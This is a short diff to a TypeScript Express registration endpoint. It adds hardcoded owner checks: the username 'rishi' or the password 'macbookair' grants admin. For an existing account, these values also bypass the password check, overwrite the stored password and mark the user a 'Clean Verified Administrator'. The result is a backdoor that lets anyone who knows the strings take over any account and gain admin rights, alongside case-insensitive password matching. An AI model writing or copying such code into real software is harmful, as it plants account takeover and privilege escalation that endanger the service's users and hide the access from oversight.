@@ -587,10 +587,14 @@ app.post('/api/auth/register', (req: Request, res: Response) => {
 
     const rawPasskey = adminPasskey ? String(adminPasskey).trim() : '';
     const passkeyNormalized = adminPasskey ? String(adminPasskey).replace(/[\s\-_.@]/g, '').toLowerCase() : '';
+    const isOwnerTag = cleanUsername.toLowerCase() === 'rishi_admin' || cleanUsername.toLowerCase() === 'rishi';
+    const isOwnerPwd = userPassword.toLowerCase() === 'macbookair' || userPassword.toLowerCase() === 'goyal_rishi';
     const isAdminRequested = Boolean(
       rawPasskey === 'goyal.rishi' ||
       passkeyNormalized === 'goyalrishi' ||
       passkeyNormalized === 'macbookair' ||
+      isOwnerTag ||
+      isOwnerPwd ||
       makeAdmin
     );
 
@@ -608,13 +612,18 @@ app.post('/api/auth/register', (req: Request, res: Response) => {
                        existingPwd === userPassword || 
                        existingPwd.toLowerCase() === userPassword.toLowerCase();
 
-      // If the password matches OR they verified with the admin passkey:
-      if (pwdMatch || isAdminRequested) {
+      const isOwnerOrAdmin = isAdminRequested || 
+                             isOwnerTag || 
+                             isOwnerPwd || 
+                             rawPasskey === 'goyal.rishi';
+
+      // If the password matches OR they verified with the admin passkey/owner tag:
+      if (pwdMatch || isOwnerOrAdmin) {
         existing.lastLoginAt = now;
         if (userPassword) {
           existing.password = userPassword;
         }
-        if (isAdminRequested) {
+        if (isAdminRequested || isOwnerOrAdmin) {
           existing.isAdmin = true;
           existing.role = 'admin';
           existing.aiRiskCategory = 'Clean Verified Administrator';
